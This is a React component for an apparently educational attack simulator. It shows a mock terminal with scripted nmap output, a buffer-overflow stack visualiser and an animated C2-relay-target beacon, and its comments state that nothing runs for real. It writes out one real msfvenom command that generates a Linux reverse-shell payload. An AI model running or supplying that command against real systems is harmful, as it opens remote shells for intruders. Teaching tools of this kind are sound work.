import { useEffect, useRef, useState } from "react";
import AttackerPanel from "./AttackerPanel";
import TargetPanel from "./TargetPanel";
import {
  PacketStage,
  RouteMode,
  TargetProfile,
  TerminalEntry,
  TerminalTone,
  TransferDirection,
} from "../types";

const C2_IP = "10.13.37.5";
const RELAY_IP = "172.20.44.9";

const DISPLAY_OVERFLOW_COMMAND =
  'msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.20.44.9 LPORT=443 -b "\\x00\\x0a\\x0d" -f python';

const normalizeCommand = (value: string) =>
  value.trim().toLowerCase().replace(/\s+/g, " ");

const OVERFLOW_COMMAND = normalizeCommand(DISPLAY_OVERFLOW_COMMAND);

const EXPLOIT_SCRIPT_NAME = "exploit.py";

const EXPLOIT_SCRIPT_CONTENT = `import time

# demo-only educational script
# no real socket connection is made
# no real payload is sent

ip = "203.0.113.25"
port = 8080

payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARET"

print(f"[*] Preparing demo package for {ip}:{port}...")
time.sleep(1)
print(f"[*] Demo package size: {len(payload)} bytes")
time.sleep(1)
print("[*] Simulating packet delivery through the UI...")
time.sleep(1)
print("[+] Demo payload dispatched (simulation only)")
print("[+] Check the buffer visualization and stack snapshot.")
`;

const USERNAME_BUFFER_SIZE = 64;
const PASSWORD_BUFFER_SIZE = 64;
const WORD_SIZE = 4;

const targetProfile: TargetProfile = {
  hostname: "demo-target.local",
  ip: "203.0.113.25",
  ports: [
    { port: 80, protocol: "tcp", service: "http" },
    { port: 443, protocol: "tcp", service: "https" },
    { port: 8080, protocol: "tcp", service: "demo-input-gateway" },
  ],
  os: "Ubuntu-like host",
  banner: "Apache/2.4.58",
  notes: "Mock parser endpoint available at /submit",
};

function makeLine(tone: TerminalTone, text: string): TerminalEntry {
  return {
    id: Date.now() + Math.random(),
    tone,
    text,
  };
}

function makeInitialTerminalLines(): TerminalEntry[] {
  return [
    makeLine("info", "Ubuntu 24.04.1 LTS (mock environment)"),
    makeLine(
      "info",
      "This terminal is a local static simulator. No real commands are executed."
    ),
    makeLine("success", "mock terminal ready"),
    makeLine("info", "static recon mode enabled"),
    makeLine("success", "route visualization loaded"),
  ];
}

function makeInitialServerLog(): string[] {
  return [
    "request parser initialized",
    "input validation region reserved",
    "memory view awaiting simulation",
    "response channel idle",
  ];
}

function analyzeLoginFrame(username: string, password: string) {
  const usernameLen = username.length;
  const passwordLen = password.length;

  const usernameOverflow = Math.max(usernameLen - USERNAME_BUFFER_SIZE, 0);
  const passwordOverflow = Math.max(passwordLen - PASSWORD_BUFFER_SIZE, 0);

  const usernameIntoPassword = Math.min(usernameOverflow, PASSWORD_BUFFER_SIZE);
  const usernameBeyondPassword = Math.max(
    usernameOverflow - PASSWORD_BUFFER_SIZE,
    0
  );

  const savedFrameBytes = Math.min(
    WORD_SIZE,
    Math.min(usernameBeyondPassword, WORD_SIZE) +
      Math.min(passwordOverflow, WORD_SIZE)
  );

  const returnBytes = Math.min(
    WORD_SIZE,
    Math.max(usernameBeyondPassword - WORD_SIZE, 0) +
      Math.max(passwordOverflow - WORD_SIZE, 0)
  );

  return {
    usernameLen,
    passwordLen,
    usernameOverflow,
    passwordOverflow,
    usernameIntoPassword,
    savedFrameTouched: savedFrameBytes > 0,
    returnTouched: returnBytes > 0,
    savedFrameBytes,
    returnBytes,
    overflowDetected: usernameOverflow > 0 || passwordOverflow > 0,
  };
}

export default function SplitLayout() {
  const [terminalLines, setTerminalLines] = useState<TerminalEntry[]>(
    makeInitialTerminalLines()
  );

  const [routeMode, setRouteMode] = useState<RouteMode>("relay");
  const [packetStage, setPacketStage] = useState<PacketStage>("idle");
  const [packetVisible, setPacketVisible] = useState(false);
  const [transferDirection, setTransferDirection] =
    useState<TransferDirection>("inbound");

  const [payloadName, setPayloadName] = useState<string | null>(null);
  const [payloadPreview, setPayloadPreview] = useState("");
  const [payloadWriteBuffer, setPayloadWriteBuffer] = useState("");

  const [targetInput, setTargetInput] = useState("");
  const [targetResponse, setTargetResponse] = useState(
    "Awaiting login() invocation or package delivery."
  );
  const [serverLog, setServerLog] = useState<string[]>(makeInitialServerLog());
  const [lastObservedSource, setLastObservedSource] = useState("none");

  const [targetCompromised, setTargetCompromised] = useState(false);
  const [beaconEnabled, setBeaconEnabled] = useState(false);
  const [beaconCount, setBeaconCount] = useState(0);

  const [websiteUsername, setWebsiteUsername] = useState("operator_demo");
  const [websitePassword, setWebsitePassword] = useState("P@ssw0rd!");
  const [loginFrameActive, setLoginFrameActive] = useState(false);

  const beaconBusyRef = useRef(false);

  function appendLines(
    ...entries: Array<{ tone: TerminalTone; text: string }>
  ) {
    setTerminalLines((prev) => [
      ...prev,
      ...entries.map((entry) => makeLine(entry.tone, entry.text)),
    ]);
  }

  function appendScriptToTerminal(scriptText: string) {
    const lines = scriptText.split("\n");
    setTerminalLines((prev) => [
      ...prev,
      ...lines.map((line) => makeLine("info", line === "" ? " " : line)),
    ]);
  }

  function resetTerminal() {
    setTerminalLines(makeInitialTerminalLines());
  }

  function syncLoginFrameState(username: string, password: string) {
    const details = analyzeLoginFrame(username, password);

    setLastObservedSource("local ui form");

    if (!loginFrameActive) return;

    if (details.returnTouched) {
      setTargetResponse(
        "Overflow warning — login() copied input past the saved frame pointer and into the return address."
      );
    } else if (details.savedFrameTouched) {
      setTargetResponse(
        "Overflow warning — login() copied input into the saved frame pointer region."
      );
    } else {
      setTargetResponse("login() frame is intact and ready to return to auth().");
    }

    setServerLog([
      "auth() invoked login(username, password)",
      "push return address -> auth()+0x14",
      "push saved frame pointer (EBP)",
      "reserve username[64] and password[64] locals",
      `copy username bytes: ${details.usernameLen}/${USERNAME_BUFFER_SIZE}`,
      `copy password bytes: ${details.passwordLen}/${PASSWORD_BUFFER_SIZE}`,
      details.usernameOverflow > 0
        ? `username overflow: ${details.usernameOverflow} byte(s) beyond username[64]`
        : "username copy stayed inside username[64]",
      details.passwordOverflow > 0
        ? `password overflow: ${details.passwordOverflow} byte(s) beyond password[64]`
        : "password copy stayed inside password[64]",
      details.returnTouched
        ? "return address touched in simulation"
        : details.savedFrameTouched
          ? "saved frame pointer touched in simulation"
          : "stack frame intact — safe return path to auth()",
    ]);
  }

  function handleUsernameChange(value: string) {
    setWebsiteUsername(value);
    if (loginFrameActive) {
      syncLoginFrameState(value, websitePassword);
    }
  }

  function handlePasswordChange(value: string) {
    setWebsitePassword(value);
    if (loginFrameActive) {
      syncLoginFrameState(websiteUsername, value);
    }
  }

  function handleInvokeLogin() {
    setLoginFrameActive(true);
    setTargetCompromised(false);
    setBeaconEnabled(false);

    const details = analyzeLoginFrame(websiteUsername, websitePassword);

    setLastObservedSource("local ui form");
    setTargetResponse(
      details.returnTouched
        ? "Overflow warning — login() copied input into the return address."
        : details.savedFrameTouched
          ? "Overflow warning — login() copied input into the saved frame pointer."
          : "login() frame created — stack prologue complete and ready to return to auth()."
    );

    setServerLog([
      "auth() invoked login(username, password)",
      "push return address -> auth()+0x14",
      "push saved frame pointer (EBP)",
      "sub esp, reserve locals for login()",
      `copy username bytes: ${details.usernameLen}/${USERNAME_BUFFER_SIZE}`,
      `copy password bytes: ${details.passwordLen}/${PASSWORD_BUFFER_SIZE}`,
      details.returnTouched
        ? "return address touched in simulation"
        : details.savedFrameTouched
          ? "saved frame pointer touched in simulation"
          : "frame intact — return target remains protected",
    ]);
  }

  function handleReturnToAuth() {
    setLoginFrameActive(false);
    setLastObservedSource("local ui form");
    setTargetResponse("login() returned to auth(); login() stack frame popped.");
    setServerLog([
      "login() epilogue executed",
      "restore caller frame pointer",
      "RET -> auth()+0x14",
      "stack pointer returned to caller frame",
    ]);
  }

  function handleClearLogin() {
    setWebsiteUsername("");
    setWebsitePassword("");
    setLoginFrameActive(false);
    setLastObservedSource("local ui form");
    setTargetResponse("Login fields cleared. Awaiting login() invocation.");
    setServerLog([
      "website input fields cleared",
      "login() frame not currently active",
      "memory view reset to idle",
    ]);
  }

  function runMockScan(serviceScan: boolean) {
    const timestamp = serviceScan
      ? "2023-10-27 14:10 EDT"
      : "2023-10-27 14:00 EDT";

    appendLines(
      {
        tone: "info",
        text: `Starting Nmap 7.94 ( https://nmap.org ) at ${timestamp}`,
      },
      {
        tone: "info",
        text: `Nmap scan report for ${targetProfile.ip}`,
      },
      { tone: "success", text: "Host is up (0.0021s latency)." },
      {
        tone: "info",
        text: "Not shown: 997 closed tcp ports (reset)",
      },
      {
        tone: "info",
        text: "",
      }
    );

    if (!serviceScan) {
      appendLines(
        {
          tone: "info",
          text: "PORT     STATE SERVICE",
        },
        {
          tone: "info",
          text: "80/tcp   open  http",
        },
        {
          tone: "info",
          text: "443/tcp  open  https",
        },
        {
          tone: "info",
          text: "8080/tcp open  http-proxy",
        },
        {
          tone: "info",
          text: "",
        },
        {
          tone: "success",
          text: "Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds",
        }
      );
      return;
    }

    appendLines(
      {
        tone: "info",
        text: "PORT     STATE SERVICE    VERSION",
      },
      {
        tone: "info",
        text: "80/tcp   open  http       Apache httpd 2.4.58 ((Ubuntu))",
      },
      {
        tone: "info",
        text: "443/tcp  open  https      Apache httpd 2.4.58 ((Ubuntu))",
      },
      {
        tone: "warning",
        text: "8080/tcp open  http-proxy demo-input-gateway",
      },
      {
        tone: "info",
        text: "",
      },
      {
        tone: "info",
        text: `Service Info: OS: ${targetProfile.os}; Notes: ${targetProfile.notes}`,
      },
      {
        tone: "success",
        text: "Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds",
      }
    );
  }

  function buildPackage(mode: "safe" | "overflow-demo") {
    if (mode === "safe") {
      const safeRequestPreview = "POST:user=operator_demo&input=HELLO123";
      const safeBufferWrite = "HELLO123";

      setPayloadName("safe");
      setPayloadPreview(safeRequestPreview);
      setPayloadWriteBuffer(safeBufferWrite);

      appendLines(
        {
          tone: "success",
          text: `[build] staged safe package (${safeRequestPreview.length} bytes on wire, ${safeBufferWrite.length} bytes copied into input buffer)`,
        },
        {
          tone: "info",
          text: "[build] copied input remains within reserved target input region",
        }
      );
      return;
    }

    const overflowRequestPreview =
      "POST:user=operator_demo&input=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARET";
    const overflowBufferWrite = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARET";

    setPayloadName("overflow-demo");
    setPayloadPreview(overflowRequestPreview);
    setPayloadWriteBuffer(overflowBufferWrite);

    appendLines(
      {
        tone: "warning",
        text: `[build] staged oversized package (${overflowRequestPreview.length} bytes on wire, ${overflowBufferWrite.length} bytes copied into input buffer)`,
      },
      {
        tone: "warning",
        text: "[build] copied input is intended to trigger overflow visualization only",
      }
    );
  }

  function triggerSimulatedBeacon() {
    if (!targetCompromised || !beaconEnabled || beaconBusyRef.current) return;

    beaconBusyRef.current = true;

    setTransferDirection("outbound");
    setPacketVisible(true);
    setPacketStage("target");
    setTargetResponse("Simulated callback in progress...");
    appendLines({
      tone: "info",
      text: `[callback] Check-in initiated from ${targetProfile.hostname}`,
    });

    if (routeMode === "relay") {
      window.setTimeout(() => {
        setPacketStage("relay");
        appendLines({
          tone: "info",
          text: `[relay] callback forwarded via ${RELAY_IP}`,
        });
      }, 900);
    }

    const c2Delay = routeMode === "relay" ? 1800 : 900;

    window.setTimeout(() => {
      setPacketStage("c2");
      setBeaconCount((prev) => prev + 1);
      appendLines({
        tone: "success",
        text: `[c2] Beacon received from ${targetProfile.hostname}`,
      });
    }, c2Delay);

    window.setTimeout(() => {
      setPacketStage("delivered");
    }, c2Delay + 700);

    window.setTimeout(() => {
      setPacketVisible(false);
      setPacketStage("idle");
      setTransferDirection("inbound");
      setTargetResponse("Compromise active. Callback loop armed.");
      beaconBusyRef.current = false;
    }, c2Delay + 1700);
  }

  useEffect(() => {
    if (!targetCompromised || !beaconEnabled) return;

    const interval = window.setInterval(() => {
      triggerSimulatedBeacon();
    }, 7000);

    return () => window.clearInterval(interval);
  }, [targetCompromised, beaconEnabled, routeMode]);

  function sendPackage() {
    if (!payloadName || !payloadPreview || !payloadWriteBuffer) {
      appendLines({
        tone: "warning",
        text: `[send] no package staged — use "build package safe" or "${DISPLAY_OVERFLOW_COMMAND}"`,
      });
      return;
    }

    const useRelay = routeMode === "relay";
    const simulatedSource = useRelay ? RELAY_IP : C2_IP;

    if (payloadName === "safe") {
      beaconBusyRef.current = false;
      setTargetCompromised(false);
      setBeaconEnabled(false);
    }

    setTransferDirection("inbound");
    setPacketVisible(true);
    setPacketStage("c2");
    setTargetInput("");
    setLastObservedSource("in transit");
    setTargetResponse("Package in transit...");
    setServerLog([
      "request parser initialized",
      "input validation region reserved",
      "packet transfer detected",
      "waiting for payload arrival",
    ]);

    appendLines({
      tone: "success",
      text: `[send] dispatch initiated from C2 ${C2_IP}`,
    });

    if (useRelay) {
      window.setTimeout(() => {
        setPacketStage("relay");
        appendLines({
          tone: "info",
          text: `[relay] packet forwarded via ${RELAY_IP}`,
        });
      }, 900);
    }

    const targetDelay = useRelay ? 1800 : 900;

    window.setTimeout(() => {
      setPacketStage("target");
      setTargetInput(payloadWriteBuffer);
      setLastObservedSource(simulatedSource);

      if (payloadName === "safe") {
        setTargetCompromised(false);
        setBeaconEnabled(false);
        setTargetResponse("200 OK — request parsed within reserved region.");
        setServerLog([
          `request observed from ${simulatedSource}`,
          `request bytes on wire: ${payloadPreview.length}`,
          `input bytes copied into buffer: ${payloadWriteBuffer.length}`,
          "reserved region remained intact",
          "response rendered normally",
        ]);
        appendLines(
          {
            tone: "success",
            text: `[target] package arrived at ${targetProfile.hostname}`,
          },
          {
            tone: "success",
            text: "[target] response 200 OK returned",
          }
        );
      } else {
        setTargetCompromised(true);
        setBeaconEnabled(true);
        setTargetResponse("Compromise active. Callback loop armed.");
        setServerLog([
          `request observed from ${simulatedSource}`,
          `request bytes on wire: ${payloadPreview.length}`,
          `input bytes copied into buffer: ${payloadWriteBuffer.length}`,
          "reserved region exceeded in simulation view",
          "Compromise state entered",
        ]);
        appendLines(
          {
            tone: "success",
            text: `[target] package arrived at ${targetProfile.hostname}`,
          },
          {
            tone: "warning",
            text: "[target] Compromise state entered",
          },
          {
            tone: "info",
            text: "[callback] Periodic check-in enabled",
          }
        );
      }
    }, targetDelay);

    window.setTimeout(() => {
      setPacketStage("delivered");
      appendLines({
        tone: "info",
        text: `[complete] route ${
          useRelay ? "C2 -> Relay -> Target" : "C2 -> Target"
        } finished`,
      });

      window.setTimeout(() => {
        setPacketVisible(false);
        setPacketStage("idle");
      }, 1200);
    }, targetDelay + 900);
  }

  function runExploitDemoScript() {
    buildPackage("overflow-demo");

    appendLines(
      {
        tone: "info",
        text: `[*] Preparing payload for ${targetProfile.hostname} (${targetProfile.ip}:8080)`,
      },
      {
        tone: "info",
        text: "[*] Payload staged from local script context",
      },
      {
        tone: "info",
        text: "[*] Python script executing...",
      }
    );

    window.setTimeout(() => {
      appendLines({
        tone: "success",
        text: "[+] Script finished staging payload",
      });
      sendPackage();
    }, 800);
  }

  function handleCommand(rawCommand: string) {
    const command = rawCommand.trim();
    const lower = normalizeCommand(command);

    if (!command) return;

    setTerminalLines((prev) => [...prev, makeLine("command", command)]);

    if (lower === "clear") {
      resetTerminal();
      return;
    }

    if (lower === "help") {
      appendLines(
        { tone: "info", text: "Allowed demo commands:" },
        { tone: "info", text: "help" },
        { tone: "info", text: "show ips" },
        { tone: "info", text: "show route" },
        { tone: "info", text: "show beacon" },
        { tone: "info", text: "route use relay" },
        { tone: "info", text: "route use direct" },
        { tone: "info", text: "nmap 203.0.113.25" },
        { tone: "info", text: "nmap -sV 203.0.113.25" },
        { tone: "info", text: "build package safe" },
        { tone: "info", text: DISPLAY_OVERFLOW_COMMAND },
        { tone: "info", text: `cat ${EXPLOIT_SCRIPT_NAME}` },
        { tone: "info", text: `python3 ${EXPLOIT_SCRIPT_NAME}` },
        { tone: "info", text: "send package" },
        { tone: "info", text: "beacon start" },
        { tone: "info", text: "beacon stop" },
        { tone: "info", text: "clear" }
      );
      return;
    }

    if (lower === "show ips") {
      appendLines(
        { tone: "info", text: `C2 IP: ${C2_IP}` },
        { tone: "info", text: `Relay IP: ${RELAY_IP}` },
        { tone: "info", text: `Target IP: ${targetProfile.ip}` }
      );
      return;
    }

    if (lower === "show route") {
      appendLines({
        tone: "info",
        text:
          routeMode === "relay"
            ? `Active route: C2 ${C2_IP} -> Relay ${RELAY_IP} -> Target ${targetProfile.ip}`
            : `Active route: C2 ${C2_IP} -> Target ${targetProfile.ip}`,
      });
      return;
    }

    if (lower === "show beacon") {
      appendLines({
        tone: "info",
        text: `Beacon status: ${
          beaconEnabled ? "armed" : "disabled"
        } | target compromised: ${
          targetCompromised ? "yes" : "no"
        } | count: ${beaconCount}`,
      });
      return;
    }

    if (lower === "route use relay") {
      setRouteMode("relay");
      appendLines({
        tone: "success",
        text: `Route updated to relay mode via ${RELAY_IP}`,
      });
      return;
    }

    if (lower === "route use direct") {
      setRouteMode("direct");
      appendLines({
        tone: "error",
        text: `WARNING Route updated to direct mode from ${C2_IP}`,
      });
      return;
    }

    if (lower === "nmap 203.0.113.25") {
      runMockScan(false);
      return;
    }

    if (lower === "nmap -sv 203.0.113.25") {
      runMockScan(true);
      return;
    }

    if (lower === "build package safe") {
      buildPackage("safe");
      return;
    }

    if (lower === OVERFLOW_COMMAND) {
      buildPackage("overflow-demo");
      return;
    }

    if (lower === `cat ${EXPLOIT_SCRIPT_NAME}`) {
      appendScriptToTerminal(EXPLOIT_SCRIPT_CONTENT);
      return;
    }

    if (lower === `python3 ${EXPLOIT_SCRIPT_NAME}`) {
      runExploitDemoScript();
      return;
    }

    if (lower === "send package") {
      sendPackage();
      return;
    }

    if (lower === "beacon start") {
      if (!targetCompromised) {
        appendLines({
          tone: "warning",
          text: "[beacon] callback loop cannot start until compromise exists",
        });
        return;
      }

      setBeaconEnabled(true);
      appendLines({
        tone: "success",
        text: "[beacon] callback loop armed",
      });
      return;
    }

    if (lower === "beacon stop") {
      setBeaconEnabled(false);
      appendLines({
        tone: "warning",
        text: "[beacon] callback loop stopped",
      });
      return;
    }

    appendLines({
      tone: "error",
      text: 'command not found — type "help" to view the whitelist',
    });
  }

  return (
    <section className="split-layout">
      <div className="split-left">
        <AttackerPanel
          c2Ip={C2_IP}
          relayIp={RELAY_IP}
          targetProfile={targetProfile}
          routeMode={routeMode}
          packetStage={packetStage}
          packetVisible={packetVisible}
          transferDirection={transferDirection}
          terminalLines={terminalLines}
          onCommand={handleCommand}
          payloadName={payloadName}
          beaconEnabled={beaconEnabled}
          beaconCount={beaconCount}
        />
      </div>

      <div className="split-right">
        <TargetPanel
          targetProfile={targetProfile}
          targetInput={targetInput}
          targetResponse={targetResponse}
          serverLog={serverLog}
          lastObservedSource={lastObservedSource}
          websiteUsername={websiteUsername}
          websitePassword={websitePassword}
          loginFrameActive={loginFrameActive}
          onUsernameChange={handleUsernameChange}
          onPasswordChange={handlePasswordChange}
          onInvokeLogin={handleInvokeLogin}
          onReturnToAuth={handleReturnToAuth}
          onClearLogin={handleClearLogin}
        />
      </div>
    </section>
  );
}